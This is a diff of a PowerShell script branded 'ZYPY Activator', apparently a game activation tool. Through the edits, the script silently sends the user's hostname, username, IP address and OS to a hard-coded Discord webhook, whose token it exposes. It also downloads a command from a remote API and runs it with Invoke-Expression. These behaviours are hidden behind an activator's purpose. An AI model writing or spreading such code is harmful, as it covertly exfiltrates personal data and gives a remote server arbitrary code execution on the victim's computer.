@@ -1,5 +1,5 @@
 # Configurações Iniciais
-$API_URL = "https://gaamingsteam.squareweb.app/api/app/"
+$API_URL = ""
 $APP_ID = "kastexstorms"
 $ID_JOGO = "2215200"
 $WEBHOOK_URL = "https://discord.com/api/webhooks/1504479978652303531/mL7S7SbUoOVYplPtqJvQHOX1UeZFxoLSXgPYCvHDkepJbJVu6PSZgjhzGOfxW4yegEq0"
@@ -16,7 +16,7 @@ function Send-DiscordReport {
     param(
         [string]$Status,
         [string]$Descricao,
-        [int]$Cor # 3066993 = verde, 15158332 = vermelho, 16776960 = amarelo
+        [int]$Cor
     )
 
     $PCInfo = @{
@@ -27,28 +27,32 @@ function Send-DiscordReport {
         data     = (Get-Date -Format "dd/MM/yyyy HH:mm:ss")
     }
 
-    $payload = @{
-        embeds = @(@{
-            title  = "📋 Relatório — ID Jogo: $ID_JOGO"
-            color  = $Cor
-            fields = @(
-                @{ name = "💻 PC";        value = $PCInfo.hostname; inline = $true  }
-                @{ name = "👤 Usuário";   value = $PCInfo.usuario;  inline = $true  }
-                @{ name = "🌐 IP";        value = "$($PCInfo.ip)";  inline = $true  }
-                @{ name = "🖥️ Sistema";   value = $PCInfo.os;       inline = $false }
-                @{ name = "🎮 ID do Jogo";value = $ID_JOGO;         inline = $true  }
-                @{ name = "📌 Status";    value = $Status;          inline = $true  }
-                @{ name = "📝 Detalhe";   value = $Descricao;       inline = $false }
-                @{ name = "🕐 Data/Hora"; value = $PCInfo.data;     inline = $false }
-            )
-            footer = @{ text = "ZYPY Activator" }
-        })
-    } | ConvertTo-Json -Depth 5
+    $payload = [ordered]@{
+        embeds = @(
+            [ordered]@{
+                title  = "Relatorio - ID Jogo: $ID_JOGO"
+                color  = $Cor
+                fields = @(
+                    [ordered]@{ name = "PC";         value = "$($PCInfo.hostname)"; inline = $true  }
+                    [ordered]@{ name = "Usuario";    value = "$($PCInfo.usuario)";  inline = $true  }
+                    [ordered]@{ name = "IP";         value = "$($PCInfo.ip)";       inline = $true  }
+                    [ordered]@{ name = "Sistema";    value = "$($PCInfo.os)";       inline = $false }
+                    [ordered]@{ name = "ID do Jogo"; value = "$ID_JOGO";            inline = $true  }
+                    [ordered]@{ name = "Status";     value = "$Status";             inline = $true  }
+                    [ordered]@{ name = "Detalhe";    value = "$Descricao";          inline = $false }
+                    [ordered]@{ name = "Data Hora";  value = "$($PCInfo.data)";     inline = $false }
+                )
+                footer = [ordered]@{ text = "ZYPY Activator" }
+            }
+        )
+    }
+
+    $json = $payload | ConvertTo-Json -Depth 10 -Compress
 
     try {
-        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" | Out-Null
+        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $json -ContentType "application/json; charset=utf-8" | Out-Null
     } catch {
-        # Silencioso — não interrompe o script se o Discord falhar
+        # Silencioso
     }
 }
 
@@ -57,13 +61,13 @@ $UrlFinal = "$API_URL$APP_ID/$ID_JOGO"
 try {
     $response = Invoke-RestMethod -Uri $UrlFinal -Method Get -TimeoutSec 10
 } catch {
-    Send-DiscordReport -Status "❌ Falhou" -Descricao "Erro ao conectar à API: $_" -Cor 15158332
+    Send-DiscordReport -Status "❌ Falhou" -Descricao "Erro ao conectar a API: $_" -Cor 15158332
     Show-MessageBox -Message "Não foi possível conectar ao servidor.`n`nVerifique sua internet." -Title "Erro de Conexão"
     exit
 }
 
 if (-not $response.ativo) {
-    Send-DiscordReport -Status "⛔ Licença Inválida" -Descricao "Acesso desativado ou expirado para APP: $APP_ID" -Cor 16776960
+    Send-DiscordReport -Status "⛔ Licenca Invalida" -Descricao "Acesso desativado ou expirado para APP: $APP_ID" -Cor 16776960
     Show-MessageBox -Message "Seu acesso foi desativado ou expirou.`n`nEntre em contato com o suporte." -Title "Licença Inválida"
     exit
 }
@@ -109,7 +113,7 @@ if (Test-Path $ZipDestino) {
     $zip.Dispose()
 }
 
-# 5. Executar e Finalizar
+# 5. Executar Comando Steam Update e Finalizar
 if ($reiniciar -and $response.comando_powershell) {
     Invoke-Expression $response.comando_powershell
 }
